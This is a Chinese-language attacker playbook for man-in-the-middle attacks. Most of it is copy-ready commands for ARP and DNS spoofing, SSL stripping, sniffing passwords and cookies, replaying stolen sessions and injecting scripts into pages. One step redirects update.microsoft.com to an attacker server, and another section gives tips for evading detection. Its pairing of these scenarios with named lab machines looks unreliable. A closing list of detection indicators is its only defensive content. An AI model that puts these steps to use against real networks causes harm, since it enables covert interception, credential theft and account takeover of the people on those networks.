# 网络嗅探和中间人攻击状态机

## 概述
中间人攻击（MITM）通过在通信双方之间插入攻击者，实现流量拦截、篡改和窃听。本状态机涵盖 ARP 欺骗、DNS 劫持、SSL 剥离等经典 MITM 技术。

## 攻击流程图

```mermaid
graph TD
    A[进入目标网络] --> B{网络拓扑分析}
    B -->|识别网关| C[确定攻击目标]
    B -->|识别主机| D[选择受害者]

    C --> E{选择 MITM 技术}
    E -->|ARP 欺骗| F[arpspoof/ettercap]
    E -->|DNS 劫持| G[dnsspoof]
    E -->|DHCP 欺骗| H[yersinia]
    E -->|ICMP 重定向| I[icmpredirect]

    F --> J[启用 IP 转发]
    G --> J
    H --> J
    I --> J

    J --> K{流量拦截成功?}
    K -->|是| L[选择攻击方式]
    K -->|否| M[调整攻击参数]
    M --> E

    L --> N{攻击目标}
    N -->|HTTP 流量| O[SSL 剥离]
    N -->|[凭证窃取](06-credential-extraction.md)| P[嗅探密码]
    N -->|会话劫持| Q[Cookie 窃取]
    N -->|流量篡改| R[注入恶意代码]

    O --> S[sslstrip/bettercap]
    P --> T[wireshark/tcpdump]
    Q --> U[ferret/hamster]
    R --> V[mitmproxy/bettercap]

    S --> W[获得明文凭证]
    T --> W
    U --> X[劫持会话]
    V --> Y[植入后门]

    W --> Z[横向移动]
    X --> Z
    Y --> Z
```

## 状态转换表

| 当前状态 | 条件 | 动作 | 下一状态 | 工具 |
|---------|------|------|---------|------|
| 网络分析 | 发现网关 | 记录网关 MAC/IP | 选择目标 | netdiscover, arp-scan |
| 网络分析 | 发现主机 | 记录主机列表 | 选择受害者 | nmap |
| 选择技术 | 二层网络 | ARP 欺骗 | 启动攻击 | arpspoof, ettercap |
| 选择技术 | DNS 可用 | DNS 劫持 | 启动攻击 | dnsspoof |
| 启动攻击 | 需要转发 | 启用 IP 转发 | 流量拦截 | sysctl |
| 流量拦截 | HTTP 流量 | SSL 剥离 | 获得明文 | sslstrip |
| 流量拦截 | 任意流量 | 嗅探分析 | 提取凭证 | wireshark, tcpdump |
| 流量拦截 | 需要篡改 | [代理](14-tunneling-pivoting.md)拦截 | 注入代码 | mitmproxy, bettercap |
| 获得凭证 | 有效凭证 | 验证权限 | 后续利用 | - |
| 会话劫持 | 获得 Cookie | 重放会话 | 访问账户 | - |

## 决策树

### 1. 网络拓扑分析
```
IF 进入新网络
  THEN 扫描网络拓扑
    # 发现活跃主机
    netdiscover -r 192.168.1.0/24
    OR arp-scan -l

    # 识别网关
    ip route | grep default
    # 输出: default via 192.168.1.1

    # 扫描主机详情
    nmap -sn 192.168.1.0/24
```

### 2. MITM 技术选择
```
IF 目标在同一二层网络
  THEN 使用 ARP 欺骗
    # 方法 1: arpspoof
    arpspoof -i eth0 -t <victim_ip> <gateway_ip>
    arpspoof -i eth0 -t <gateway_ip> <victim_ip>

    # 方法 2: ettercap
    ettercap -T -M arp:remote /<victim_ip>// /<gateway_ip>//

    # 方法 3: bettercap
    bettercap -iface eth0
    > set arp.spoof.targets <victim_ip>
    > arp.spoof on

ELSE IF 需要劫持 DNS
  THEN 使用 DNS 欺骗
    # 配置 DNS 映射
    echo "192.168.1.100 bank.com" > dns.conf

    # 启动 dnsspoof
    dnsspoof -i eth0 -f dns.conf

ELSE IF 可以控制 DHCP
  THEN 使用 DHCP 欺骗
    yersinia -G
    # GUI 界面发起 DHCP 欺骗
```

### 3. IP 转发配置
```
# 启用 IP 转发（必须，否则受害者断网）
echo 1 > /proc/sys/net/ipv4/ip_forward
OR sysctl -w net.ipv4.ip_forward=1

# 配置 iptables 转发规则
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i eth0 -o eth0 -j ACCEPT
```

### 4. SSL 剥离攻击
```
IF 目标访问 HTTPS 网站
  THEN 使用 SSL 剥离
    # 方法 1: sslstrip
    iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
    sslstrip -l 8080 -w sslstrip.log

    # 方法 2: bettercap
    bettercap -iface eth0
    > set http.proxy.sslstrip true
    > http.proxy on

    # 受害者访问 https://bank.com
    # 攻击者看到: http://bank.com（明文）
    # 受害者看到: http://bank.com（被降级）
```

### 5. 流量嗅探
```
IF 需要分析流量
  THEN 使用 Wireshark/tcpdump
    # 捕获所有流量
    tcpdump -i eth0 -w capture.pcap

    # 过滤 HTTP 流量
    tcpdump -i eth0 -A 'tcp port 80'

    # 过滤凭证
    tcpdump -i eth0 -A | grep -i 'password\|user'

    # Wireshark 过滤器
    http.request.method == "POST"
    http contains "password"
```

## 实战场景

### 场景 1: ARP 欺骗 + SSL 剥离
**HTB 靶机**: Poison

**攻击链路**:
1. 发现网络拓扑
   ```bash
   netdiscover -r 10.10.10.0/24
   ```
   发现: 网关 10.10.10.1, 受害者 10.10.10.84

2. 启用 IP 转发
   ```bash
   echo 1 > /proc/sys/net/ipv4/ip_forward
   ```

3. 启动 ARP 欺骗
   ```bash
   # 终端 1: 欺骗受害者
   arpspoof -i eth0 -t 10.10.10.84 10.10.10.1

   # 终端 2: 欺骗网关
   arpspoof -i eth0 -t 10.10.10.1 10.10.10.84
   ```

4. 配置 SSL 剥离
   ```bash
   # 重定向 HTTP 流量到 sslstrip
   iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

   # 启动 sslstrip
   sslstrip -l 8080 -w sslstrip.log
   ```

5. 等待受害者访问 HTTPS 网站
   ```bash
   # 监控日志
   tail -f sslstrip.log
   ```
   获得: 用户名和密码明文

### 场景 2: Ettercap 全自动 MITM
**HTB 靶机**: Sense

**攻击链路**:
1. 启动 Ettercap GUI
   ```bash
   ettercap -G
   ```

2. 配置攻击
   - Sniff → Unified sniffing → eth0
   - Hosts → Scan for hosts
   - Hosts → Hosts list
   - 选择网关和受害者
   - Mitm → ARP poisoning → Sniff remote connections

3. 启动插件
   - Plugins → Manage plugins
   - 激活 `dns_spoof`（DNS 劫持）
   - 激活 `remote_browser`（查看受害者浏览）

4. 查看捕获的凭证
   - View → Connections
   - 查看 HTTP POST 数据

### 场景 3: Bettercap 现代化 MITM
**HTB 靶机**: Carrier

**攻击链路**:
1. 启动 Bettercap
   ```bash
   bettercap -iface eth0
   ```

2. 配置 ARP 欺骗
   ```
   > set arp.spoof.targets 10.10.10.105
   > arp.spoof on
   ```

3. 启用 HTTP [代理](14-tunneling-pivoting.md)和 SSL 剥离
   ```
   > set http.proxy.sslstrip true
   > http.proxy on
   ```

4. 启用嗅探器
   ```
   > net.sniff on
   ```

5. 查看捕获的凭证
   ```
   > events.show
   ```

6. 注入 JavaScript（可选）
   ```
   > set http.proxy.script /path/to/inject.js
   > http.proxy on
   ```

### 场景 4: DNS 劫持
**HTB 靶机**: Resolute

**攻击链路**:
1. 配置 DNS 映射
   ```bash
   cat > dns.conf << EOF
   10.10.14.5 update.microsoft.com
   10.10.14.5 windowsupdate.com
   EOF
   ```

2. 启动 ARP 欺骗
   ```bash
   arpspoof -i eth0 -t 10.10.10.169 10.10.10.1
   ```

3. 启动 DNS 欺骗
   ```bash
   dnsspoof -i eth0 -f dns.conf
   ```

4. 搭建假冒服务器
   ```bash
   # 启动 Web 服务器
   python3 -m http.server 80
   ```

5. 受害者访问 update.microsoft.com 时会被重定向到攻击者服务器

### 场景 5: 会话劫持
**HTB 靶机**: Sneaky

**攻击链路**:
1. 启动 ARP 欺骗和流量捕获
   ```bash
   ettercap -T -M arp:remote /10.10.10.20// /10.10.10.1// -w capture.pcap
   ```

2. 使用 Wireshark 分析捕获文件
   ```bash
   wireshark capture.pcap
   ```
   过滤器: `http.cookie`

3. 提取 Cookie
   ```
   找到 HTTP 请求中的 Cookie 头
   Cookie: PHPSESSID=abc123xyz
   ```

4. 使用 Cookie 劫持会话
   ```bash
   # 方法 1: curl
   curl -H "Cookie: PHPSESSID=abc123xyz" http://target/admin

   # 方法 2: 浏览器插件
   # 使用 EditThisCookie 或 Cookie-Editor 插件
   # 添加捕获的 Cookie
   ```

### 场景 6: mitmproxy 流量篡改
**HTB 靶机**: Kotarak

**攻击链路**:
1. 启动 mitmproxy
   ```bash
   mitmproxy -p 8080 --mode transparent
   ```

2. 配置 iptables 重定向
   ```bash
   iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
   iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
   ```

3. 启动 ARP 欺骗
   ```bash
   arpspoof -i eth0 -t 10.10.10.55 10.10.10.1
   ```

4. 在 mitmproxy 中拦截和修改请求
   - 按 `i` 进入拦截模式
   - 设置过滤器: `~d target.com`
   - 修改请求/响应
   - 按 `a` 放行

5. 或使用脚本自动篡改
   ```python
   # inject.py
   def response(flow):
       if "text/html" in flow.response.headers.get("content-type", ""):
           flow.response.text = flow.response.text.replace(
               "</body>",
               "<script>alert('Hacked!')</script></body>"
           )
   ```
   运行: `mitmproxy -s inject.py`

## 工具对比

| 工具 | 类型 | 优势 | 劣势 | 使用场景 |
|------|------|------|------|---------|
| **arpspoof** | ARP 欺骗 | 简单轻量 | 功能单一 | 基础 ARP 欺骗 |
| **ettercap** | 综合 MITM | 功能全面，有 GUI | 较老，性能一般 | 快速 MITM 攻击 |
| **bettercap** | 现代 MITM | 功能强大，模块化 | 学习曲线陡 | 高级 MITM 场景 |
| **sslstrip** | SSL 剥离 | 专注 SSL 降级 | 需配合其他工具 | HTTPS 降级攻击 |
| **mitmproxy** | HTTP [代理](14-tunneling-pivoting.md) | 流量篡改强大 | 需要配置复杂 | 精细流量控制 |
| **wireshark** | 流量分析 | 分析能力最强 | 不主动攻击 | 流量分析和取证 |
| **tcpdump** | 流量捕获 | 命令行，轻量 | 分析能力弱 | 快速流量捕获 |

## 关键技巧

### 1. 隐蔽性提升
```bash
# 使用 MAC 地址伪造
macchanger -r eth0

# 限制 ARP 欺骗速率
arpspoof -i eth0 -t victim gateway -r 1
# -r 1: 每秒 1 个包

# 使用被动嗅探（不发送 ARP）
tcpdump -i eth0 -n -s0 -w capture.pcap
```

### 2. 流量过滤
```bash
# tcpdump 过滤 HTTP POST
tcpdump -i eth0 -A -s0 'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)'

# Wireshark 显示过滤器
http.request.method == "POST"
http.cookie contains "session"
ftp.request.command == "PASS"
```

### 3. 凭证提取
```bash
# 从 pcap 提取 HTTP 凭证
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data

# 提取 FTP 密码
tshark -r capture.pcap -Y "ftp.request.command == PASS" -T fields -e ftp.request.arg

# 提取 Cookie
tshark -r capture.pcap -Y "http.cookie" -T fields -e http.cookie
```

### 4. 防御检测绕过
```bash
# 检测 ARP 欺骗防护
arping -c 1 gateway_ip
# 如果返回多个 MAC，说明有 ARP 防护

# 使用 ICMP 重定向代替 ARP 欺骗
# （某些环境下更隐蔽）
```

## 防御检测

**攻击者视角的防御绕过**:
- 使用被动嗅探避免发送 ARP 包
- 限制 ARP 欺骗速率避免触发告警
- 使用 MAC 地址伪造
- 在非工作时间攻击

**防御者检测指标**:
- ARP 表异常（一个 IP 对应多个 MAC）
- 大量 ARP 请求
- 网关 MAC 地址变化
- SSL 证书警告增多
- 网络延迟异常增加

## 相关状态机
- [01-network-service-enumeration.md](01-network-service-enumeration.md) - 网络拓扑发现
- [08-password-attack.md](08-password-attack.md) - 使用捕获的凭证
- [03-web-application-attack.md](03-web-application-attack.md) - 会话劫持利用
- [07-wifi-attack.md](07-wifi-attack.md) - 无线网络 MITM
